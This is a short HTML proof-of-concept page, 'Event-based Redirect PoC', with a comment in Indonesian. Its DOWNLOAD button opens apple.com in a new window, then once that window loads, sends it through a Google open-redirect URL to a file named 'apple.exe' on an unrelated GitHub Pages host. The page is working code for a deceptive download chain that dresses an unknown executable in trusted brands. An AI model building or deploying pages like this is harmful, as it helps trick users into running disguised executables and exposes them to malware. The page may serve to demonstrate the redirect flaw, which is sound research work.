<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Event-based Redirect PoC</title>
</head>
<body>

<script>
function a() {
    let win = window.open("https://apple.com", "x");

    // Redirect terjadi saat window selesai load
    win.onload = function () {
        win.location.href =
            "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe";
    };
}
</script>

<center>
    <input type="button" value="DOWNLOAD" onclick="a()">
</center>

</body>
</html>
